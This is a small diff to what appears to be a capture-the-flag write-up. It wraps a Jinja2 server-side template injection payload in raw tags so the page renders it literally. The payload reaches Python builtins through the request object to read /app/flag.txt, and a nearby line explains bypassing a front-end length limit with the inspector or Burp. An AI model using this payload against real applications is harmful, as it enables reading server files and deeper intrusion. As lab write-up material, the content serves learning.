@@ -27,7 +27,9 @@ last_update: 2025-03-29T00:00:00+00:00
 - Payload :
 
 ```
+{% raw %}
     {{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
+{% endraw %}
 ```
 
 - Length of the input is restricted in the front-end, so we can either edit the length in inspect or simply use burp
